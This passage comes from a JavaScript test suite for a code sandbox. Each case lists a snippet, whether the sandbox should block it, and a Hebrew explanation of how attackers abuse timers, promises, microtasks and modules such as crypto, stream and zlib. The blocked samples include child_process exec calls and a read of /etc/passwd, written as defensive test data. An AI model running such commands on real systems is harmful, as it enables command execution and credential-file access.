    explanation: `      
      🎯 התקפה: מניעת שירות מבוססת Interval

      איך האקרים משתמשים בזה:
      קריאות setInterval מהירות יכולות לרוקן משאבים או ליצור רצף
      שגיאות שמפריע לפעולה תקינה.

      השפעה בעולם האמיתי:
      - מיצוי משאבים באמצעות callbacks מהירים
      - יצירת שגיאות מתמשכת
      - הצפת event loop
    `,
  },
  {
    name: 'JS: setImmediate abuse',
    code: `setImmediate(() => require('child_process').exec('id'));`,
    expectBlocked: true,
    category: 'timer_abuse',
    explanation: `      
      🎯 התקפה: הרצת Callback מיידית

      איך האקרים משתמשים בזה:
      setImmediate מתזמן callbacks לריצה מוקדם ככל האפשר,
      ועלול להריץ קוד זדוני לפני פעולות ניקוי.

      השפעה בעולם האמיתי:
      - הרצה לפני שקוד סינכרוני מסתיים
      - ניצול race conditions
      - הצפת תור לצורך DoS
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ASYNC EXPLOIT ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: Promise.resolve exec',
    code: `Promise.resolve().then(() => require('child_process').exec('id'));`,
    expectBlocked: true,
    category: 'async_exploits',
    explanation: `      
      🎯 התקפה: הרצה נדחית מבוססת Promise

      איך האקרים משתמשים בזה:
      Promises מאפשרים הרצה נדחית שעשויה לעקוף בדיקות
      אבטחה או auditing סינכרוניים.

      השפעה בעולם האמיתי:
      - הרצה לאחר שה-call stack הנוכחי מסתיים
      - התחמקות מניטור סינכרוני
      - שרשור כמה פעולות זדוניות
    `,
  },
  {
    name: 'JS: queueMicrotask',
    code: `queueMicrotask(() => require('fs').readFileSync('/etc/passwd'));`,
    expectBlocked: true,
    category: 'async_exploits',
    explanation: `      
      🎯 התקפה: הזרקה לתור Microtask

      איך האקרים משתמשים בזה:
      queueMicrotask מתזמן קוד לפני callbacks אסינכרוניים אחרים,
      ולכן עשוי לרוץ לפני cleanup או בדיקות אבטחה.

      השפעה בעולם האמיתי:
      - עדיפות גבוהה יותר מ-callbacks של setTimeout
      - הרצה לפני promise handlers בתור
      - התקפות עדינות שמבוססות על תזמון
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // DANGEROUS MODULE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: crypto module',
    code: `const crypto = require('crypto'); console.log(crypto.randomBytes(16));`,
    expectBlocked: true,
    category: 'dangerous_modules',
    explanation: `      
      🎯 התקפה: פעולות קריפטוגרפיות

      איך האקרים משתמשים בזה:
      crypto עצמו לא בהכרח מסוכן ישירות, אבל ניתן להשתמש בו כדי
      ליצור מפתחות לנוזקה, להצפין מידע גנוב או לכריית קריפטו.

      השפעה בעולם האמיתי:
      - יצירת מפתחות הצפנה לכופרה
      - יצירת ערוצים מאובטחים לחילוץ מידע
      - פעולות כריית מטבעות קריפטוגרפיים
    `,
  },
  {
    name: 'JS: stream module',
    code: `const stream = require('stream'); new stream.Readable();`,
    expectBlocked: true,
    category: 'dangerous_modules',
    explanation: `      
      🎯 התקפה: עיבוד מידע מבוסס Streams

      איך האקרים משתמשים בזה:
      Streams מאפשרים לעבד כמויות גדולות של מידע ביעילות,
      וזה שימושי לחילוץ מידע או לעיבוד payloads זדוניים.

      השפעה בעולם האמיתי:
      - הזרמת קבצים גדולים לחילוץ מידע
      - עיבוד payloads בינאריים
      - יצירת pipes בין תהליכים
    `,
  },
  {
    name: 'JS: zlib module',
    code: `const zlib = require('zlib'); zlib.gzipSync('data');`,
    expectBlocked: true,
    category: 'dangerous_modules',
    explanation: `      
      🎯 התקפה: דחיסה לצורך התחמקות

      איך האקרים משתמשים בזה:
      דחיסה יכולה לשמש להסתרת payloads זדוניים, לצמצום
      רוחב פס בחילוץ מידע או ליצירת decompression bombs.

      השפעה בעולם האמיתי:
      - דחיסת מידע כדי להתחמק מזיהוי מבוסס גודל
      - decompression bombs או zip bombs לצורך DoS
      - הסתרת קוד זדוני בארכיונים דחוסים
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE (should execute successfully)
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: Safe console.log',
    code: `console.log('Hello, World!');`,
    expectBlocked: false,
    expectedOutput: 'Hello, World!',
    category: 'safe_code',
    explanation: `      
      ✅ בטוח: פלט בסיסי לקונסול

      זה קוד לגיטימי שאמור לרוץ:
      פלט פשוט לקונסול הוא הבסיס ללימוד קוד
      ולדיבוג. אין כאן סיכון אבטחה.
    `,
  },
  {
    name: 'JS: Safe math',
    code: `console.log(2 + 2);`,
    expectBlocked: false,
    expectedOutput: '4',
    category: 'safe_code',
    explanation: `      
      ✅ בטוח: פעולות מתמטיות

      זה קוד לגיטימי שאמור לרוץ:
      פעולות חשבון בסיסיות הן יסוד בתכנות
      ואינן מהוות סיכון אבטחה.
    `,
  },
  {
    name: 'JS: Safe array operations',
    code: `const arr = [1,2,3].map(x => x * 2); console.log(arr.join(','));`,
    expectBlocked: false,
    expectedOutput: '2,4,6',
    category: 'safe_code',
    explanation: `      
      ✅ בטוח: פעולות מערך

      זה קוד לגיטימי שאמור לרוץ:
      מתודות לעבודה עם מערכים כמו map, filter ו-join הן
      חיוניות לעיבוד נתונים.
    `,
  },
  {
    name: 'JS: Safe async/await',
    code: `const delay = ms => new Promise(r => setTimeout(r, ms)); await delay(10); console.log('done');`,
    expectBlocked: false,
    expectedOutput: 'done',
    category: 'safe_code',
    explanation: `      
      ✅ בטוח: דפוסי Async/Await

      זה קוד לגיטימי שאמור לרוץ:
      קוד אסינכרוני מבוסס Promise עם השהיות קצרות הוא נפוץ ובטוח.
      חשוב ללמד דפוסים אסינכרוניים.
    `,
  },
];
